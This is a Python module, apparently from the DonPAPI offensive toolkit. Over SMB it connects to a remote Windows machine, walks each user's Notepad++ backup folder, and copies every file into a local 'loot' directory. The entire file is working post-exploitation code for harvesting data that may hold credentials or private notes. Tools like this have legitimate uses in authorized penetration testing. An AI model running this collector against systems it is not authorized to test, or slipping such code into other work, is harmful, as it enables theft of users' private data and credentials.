import os
import ntpath
from typing import Any
from dploot.lib.target import Target
from dploot.lib.smb import DPLootSMBConnection
from donpapi.core import DonPAPICore
from donpapi.lib.logger import DonPAPIAdapter


TAG = "NotepadPP"

class NotepadPPDump:
    false_positive = [".", "..", "desktop.ini", "Public", "Default", "Default User", "All Users", ".NET v4.5", ".NET v4.5 Classic"]
    user_directories = ["Users\\{username}\\AppData\\Roaming\\Notepad++\\backup\\"]
    max_filesize = 5000000

    def __init__(self, target: Target, conn: DPLootSMBConnection, masterkeys: list, options: Any, logger: DonPAPIAdapter, context: DonPAPICore) -> None:
        self.target = target
        self.conn = conn
        self.masterkeys = masterkeys
        self.options = options
        self.logger = logger
        self.context = context
        self.found = 0

    def run(self):
        
        self.logger.display("Gathering notepad++ backup files")
        for user in self.context.users:
            for directory in self.user_directories:
                directory_path = directory.format(username=user)
                self.dig_files(directory_path=directory_path, recurse_level=0, recurse_max=10)
        self.logger.secret(f"Found {self.found} notepad++ backup files", TAG)

    def dig_files(self, directory_path, recurse_level=0, recurse_max=10):
        directory_list = self.conn.remote_list_dir(self.context.share, directory_path)
        if directory_list is not None:
            for item in directory_list:
                if item.get_longname() not in self.false_positive:
                    self.found += 1
                    new_path = ntpath.join(directory_path, item.get_longname())
                    file_content = self.conn.readFile(self.context.share, new_path)
                    local_filepath = os.path.join(self.context.output_dir, *(new_path.split('\\')))
                    # Stores the file in loot\TARGET\Users\{username}\AppData\
                    os.makedirs(os.path.dirname(local_filepath), exist_ok=True)
                    with open(local_filepath, "wb") as f:
                        if file_content is None:
                            file_content = b""
                        f.write(file_content)
                    
                    # Stores files in loot\NotepadPP
                    os.makedirs(f"{self.context.output_dir}/../NotepadPP", exist_ok=True)
                    local_filepath = os.path.join(
                        f"{self.context.output_dir}/../NotepadPP", 
                        f"{item.get_longname()}-{self.found}"
                    )
                    with open(local_filepath, "wb") as f:
                        if file_content is None:
                            file_content = b""
                        f.write(file_content)
                    
